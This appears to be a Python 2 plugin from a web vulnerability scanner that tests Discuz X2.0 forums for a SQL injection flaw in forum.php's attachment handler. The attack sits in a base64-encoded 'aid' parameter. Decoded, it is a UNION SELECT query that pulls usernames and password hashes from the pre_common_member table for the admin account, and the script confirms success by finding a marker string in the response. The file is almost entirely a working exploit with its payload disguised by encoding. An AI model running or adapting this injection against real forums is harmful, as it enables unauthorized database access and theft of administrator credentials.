#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "forum.php?mod=attachment&findpost=ss&aid=MScgYW5kIDE9MiB1bmlvbiBhbGwgc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lLDB4NEU1NjUzNUY1NDQ1NTM1NCxwYXNzd29yZCkgZnJvbSBwcmVfY29tbW9uX21lbWJlciB3aGVyZSAgdXNlcm5hbWUgbGlrZSAnYWRtaW58eHx5"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find('NVS_TEST')>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:DZX2.0SQLINJECITONSCRIPT.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:DZX2.0SQLINJECITONSCRIPT.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def